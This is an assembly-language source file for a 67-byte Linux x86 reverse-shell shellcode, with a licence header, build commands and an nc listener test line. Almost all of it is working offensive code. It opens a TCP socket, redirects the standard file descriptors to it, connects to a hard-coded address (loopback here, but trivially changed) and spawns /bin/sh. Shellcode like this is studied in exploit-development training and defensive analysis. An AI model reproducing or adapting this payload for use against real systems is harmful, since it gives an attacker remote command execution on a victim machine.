; Tiny Shell Reverse TCP - Assembly Language
; Linux/x86
;
; Written in 2013 by Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This source is licensed under the Creative Commons
; Attribution-ShareAlike 3.0 Brazil License.
;
; To view a copy of this license, visit
;
;   http://creativecommons.org/licenses/by-sa/3.0/
;
; You are free:
;
;    to Share - to copy, distribute and transmit the work
;    to Remix - to adapt the work
;    to make commercial use of the work
;
; Under the following conditions:
;   Attribution - You must attribute the work in the manner
;                 specified by the author or licensor (but
;                 not in any way that suggests that they
;                 endorse you or your use of the work).
;
;   Share Alike - If you alter, transform, or build upon
;                 this work, you may distribute the
;                 resulting work only under the same or
;                 similar license to this one.
;
;


; tiny_shell_reverse_tcp
;
; * 67 bytes
; * null-free if the IP and port are
;
;
; # nasm -f elf32 tiny_shell_reverse_tcp.asm
; # ld -m elf_i386 tiny_shell_reverse_tcp.o -o tiny_shell_reverse_tcp
;
; Testing
; # nc 127.1.1.1 11111
; # ./tiny_shell_reverse_tcp


global _start

section .text

_start:
	; Avoiding garbage
	; Putting zero in three registers (eax, ebx and edx), search about mul instruction for understanding

	xor ebx, ebx
	mul ebx

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	mov al, 102		; syscall 102 - socketcall
	inc ebx			; socketcall type (sys_socket 1)

	; socket arguments (bits/socket.h, netinet/in.h)
	push edx		; IPPROTO_IP = 0 (int)
	push ebx		; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption


        ; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
        ; int dup2(int oldfd, int newfd);
        ; dup2(clientfd, ...)

        pop ecx                 ; pop the sockfd integer to use as the loop counter ecx
        xchg ebx, eax           ; swapping registers values to put created sockfd in ebx as argument in next syscall ($

dup_loop:
        mov al, 63              ; syscall 63 - dup2

        int 0x80                ; kernel interruption

        dec ecx                 ; file descriptor and loop counter

        jns dup_loop


        ; Connecting the duplicated file descriptor to the host
        ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        ; connect(sockfd, [AF_INET, 55555, 127.1.1.1], 16)

	mov al, 102		; syscall 102 - socketcall
				; socketcall type (sys_connect 3)

	; building the sockaddr_in struct (sys/socket.h, netinet/in.h and bits/sockaddr.h)
	push 0x0101017f		; IP number
	push WORD 0x672b	; port number 11111 in hex reverse order
	push WORD 2		; AF_INET = 2 (unsigned short int)
	mov ecx, esp		; struct pointer

	; connect arguments
        push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
        push ecx                ; sockaddr_in struct pointer (struct sockaddr *)
        push ebx                ; socket fd (int)
	mov ecx, esp

	int 0x80


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	mov al, 11		; execve syscall

	; execve string argument
	push edx		; null-byte
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"

	mov ebx, esp		; ptr to ["/bin//sh", NULL] string

	xor ecx, ecx		; zero to argv
				; zero to envp (edx)

	int 0x80
